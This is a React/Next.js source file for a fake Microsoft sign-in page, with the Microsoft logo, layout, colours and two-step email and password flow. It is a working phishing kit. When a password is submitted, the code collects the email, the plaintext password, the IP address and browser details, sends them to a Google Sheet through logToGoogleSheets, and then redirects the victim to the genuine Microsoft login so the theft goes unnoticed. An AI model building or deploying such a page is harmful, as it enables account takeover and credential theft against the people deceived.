'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Link from 'next/link';
import { Inter } from 'next/font/google';
import { logToGoogleSheets } from '@/utils/sheets';

const inter = Inter({ subsets: ['latin'] });

// Define a type for userInfo
type UserInfo = {
  userAgent: string;
  language: string;
  platform: string;
  vendor: string;
  screenResolution: string;
  ip: string;
};

export default function LoginFlow() {
  const router = useRouter();
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [userInfo, setUserInfo] = useState<UserInfo>({
    userAgent: '',
    language: '',
    platform: '',
    vendor: '',
    screenResolution: '',
    ip: '',
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    // Collect browser and system information
    const browserInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      vendor: navigator.vendor,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
    };

    // Fetch IP address
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setUserInfo({
          ...browserInfo,
          ip: data.ip,
        });
      })
      .catch((error) => console.error('Error fetching IP:', error));
  }, []);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError('Please enter a valid email address.');
      return;
    }
    setError('');
    console.log('Email entered:', email);
    console.log('User information:', userInfo);
    setStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const loginData = {
      email,
      password,
      timestamp: new Date().toISOString(),
      ...userInfo,
    };

    // Log to console
    console.log('Login attempt:', loginData);

    // Log to Google Sheets
    await logToGoogleSheets(loginData);

    // Handle password submission
    console.log('Password submitted');

    // Redirect to dashboard
    router.push(
      'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
    );
  };

  return (
    <div
      className={`min-h-screen flex items-center justify-center bg-gradient-to-br from-rose-50 via-sky-50 to-emerald-50 ${inter.className}`}
    >
      <div className="w-full max-w-[440px] p-4">
        <div className="bg-white shadow-lg rounded-sm p-6">
          <div className="mb-6">
            <Image
              src="/microsoft-logo.svg"
              alt="Microsoft"
              width={108}
              height={24}
              priority
            />
          </div>

          {loading ? (
            <div className="flex justify-center items-center">
              <div className="loader"></div>
            </div>
          ) : step === 'email' ? (
            <form onSubmit={handleEmailSubmit} className="space-y-6">
              <div className="space-y-6">
                <h1 className="text-2xl font-light text-gray-900">
                  Sign in
                </h1>
                <input
                  type="text"
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="w-full h-9 px-2 text-base border border-gray-300 hover:border-gray-400 focus:border-[#0067b8] focus:outline-none text-black bg-white"
                />
                {error && (
                  <p className="text-red-500 text-sm">{error}</p>
                )}
              </div>
              <div className="space-y-4">
                <div className="text-sm">
                  <span className="text-gray-600">No account? </span>
                  <Link
                    href="#"
                    className="text-[#0067b8] hover:text-[#005da6] hover:underline"
                  >
                    Create one!
                  </Link>
                </div>
                <Link
                  href="#"
                  className="text-sm text-[#0067b8] hover:text-[#005da6] hover:underline"
                >
                  Can&apos;t access your account?
                </Link>
              </div>
              <div className="flex justify-end">
                <button
                  type="submit"
                  className="min-w-[108px] h-9 px-4 bg-[#0067b8] hover:bg-[#005da6] text-white text-sm font-semibold"
                >
                  Next
                </button>
              </div>
            </form>
          ) : (
            <form
              onSubmit={handlePasswordSubmit}
              className="space-y-6"
            >
              <div className="space-y-6">
                <div>
                  <h1 className="text-2xl font-light text-gray-900 mb-2">
                    Enter password
                  </h1>
                  <div className="text-sm text-gray-600">{email}</div>
                </div>
                <input
                  type="password"
                  placeholder="Password"
                  required
                  className="w-full h-9 px-2 text-base border border-gray-300 hover:border-gray-400 focus:border-[#0067b8] focus:outline-none text-black bg-white"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <div className="space-y-4">
                <Link
                  href="#"
                  className="text-sm text-[#0067b8] hover:text-[#005da6] hover:underline"
                >
                  Forgot password?
                </Link>
                <div className="text-sm">
                  <Link
                    href="#"
                    className="text-[#0067b8] hover:text-[#005da6] hover:underline"
                  >
                    Email code to {email}
                  </Link>
                </div>
              </div>
              <div className="flex justify-end">
                <button
                  type="submit"
                  className="min-w-[108px] h-9 px-4 bg-[#0067b8] hover:bg-[#005da6] text-white text-sm font-semibold"
                >
                  Sign in
                </button>
              </div>
            </form>
          )}
        </div>

        <div className="mt-4 bg-white shadow-lg rounded-sm p-3">
          <button
            type="button"
            className="text-gray-600 hover:text-gray-900 text-sm"
            onClick={() => {
              setStep('email');
              setPassword('');
            }}
          >
            Sign-in options
          </button>
        </div>
      </div>
    </div>
  );
}
